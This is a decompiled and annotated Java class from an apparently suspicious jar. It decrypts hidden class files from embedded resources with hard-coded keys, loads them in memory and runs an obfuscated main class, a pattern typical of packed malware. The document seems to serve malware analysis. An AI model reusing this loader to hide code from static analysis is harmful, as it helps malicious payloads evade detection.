package net.java;

import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * A custom class loader that loads classes from encrypted resource files.
 * This is likely used to hide the core logic of the application from static analysis.
 */
public class DynamicClassLoader extends ClassLoader {
    public static final String RESOURCE_PATH_A = "/5OFV7PFTIMB0V";
    private static final String RESOURCE_PATH_B = "/net/java/a";
    private static final String RESOURCE_PATH_C = "/net/java/b";
    private static final String RESOURCE_PATH_D = "/net/java/c";
    private static final String RESOURCE_PATH_E = "/net/java/d";
    private static final String RESOURCE_PATH_F = "/net/java/e";

    private static final long KEY_A = -1083759330220665782L;
    private static final long KEY_B = -4062297973245990737L;

    private final HashMap<String, byte[]> classCache = new HashMap<>();

    /**
     * Constructs a new DynamicClassLoader. It reads an encrypted resource file,
     * decrypts it, and loads the class definitions into a cache.
     */
    public DynamicClassLoader() {
    byte[] decryptedData = CoreUtils.decryptData(CoreUtils.readResource(RESOURCE_PATH_C, "\\a"));
        try (DataInputStream dataInputStream = new DataInputStream(new ByteArrayInputStream(decryptedData))) {
            while (dataInputStream.available() > 0) {
                String className = dataInputStream.readUTF();
                byte[] classBytes = new byte[dataInputStream.readInt()];
                dataInputStream.readFully(classBytes);
                classCache.put(className, classBytes);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /**
     * Overrides the default class loading mechanism to load classes from the cache.
     * If a class is not found in the cache, it delegates to the parent class loader.
     *
     * @param name The binary name of the class
     * @return The resulting <tt>Class</tt> object
     */
    @Override
    public synchronized Class<?> loadClass(String name) throws ClassNotFoundException {
        Class<?> loadedClass = findLoadedClass(name);
        if (loadedClass == null) {
            byte[] classBytes = classCache.get(name);
            if (classBytes != null) {
                loadedClass = defineClass(name, classBytes, 0, classBytes.length);
            } else {
                loadedClass = super.loadClass(name);
            }
        }
        return loadedClass;
    }

    /**
     * Initializes some static fields in the CoreUtils class. These fields are
     * likely used for decryption or other core functionality.
     */
    public static void initialize() {
        CoreUtils.RESOURCE_D_PATH = RESOURCE_PATH_D;
        CoreUtils.RESOURCE_C_PATH = RESOURCE_PATH_C;
        CoreUtils.DECRYPTION_KEY_A = KEY_A;
        CoreUtils.DECRYPTION_KEY_B = KEY_B;
    }

    /**
     * The main entry point for the standalone application. It creates a new
     * DynamicClassLoader, loads the main class ("a"), and calls its main method.
     *
     * @param args Command line arguments.
     */
    public static void main(String[] args) {
        initialize();
        DynamicClassLoader classLoader = new DynamicClassLoader();
        try {
            Method mainMethod = classLoader.loadClass("a").getDeclaredMethod("main", String[].class);
            String[] newArgs = new String[args.length + 6];
            newArgs[0] = RESOURCE_PATH_B;
            newArgs[1] = RESOURCE_PATH_C;
            newArgs[2] = RESOURCE_PATH_D;
            newArgs[3] = RESOURCE_PATH_E;
            newArgs[4] = RESOURCE_PATH_F;
            newArgs[5] = RESOURCE_PATH_A;
            System.arraycopy(args, 0, newArgs, 6, args.length);
            mainMethod.invoke(null, (Object) newArgs);
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }
}


/* Location:              /Users/apple/Downloads/9z72uyksgx.jar!/net/java/m.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       1.1.3
 */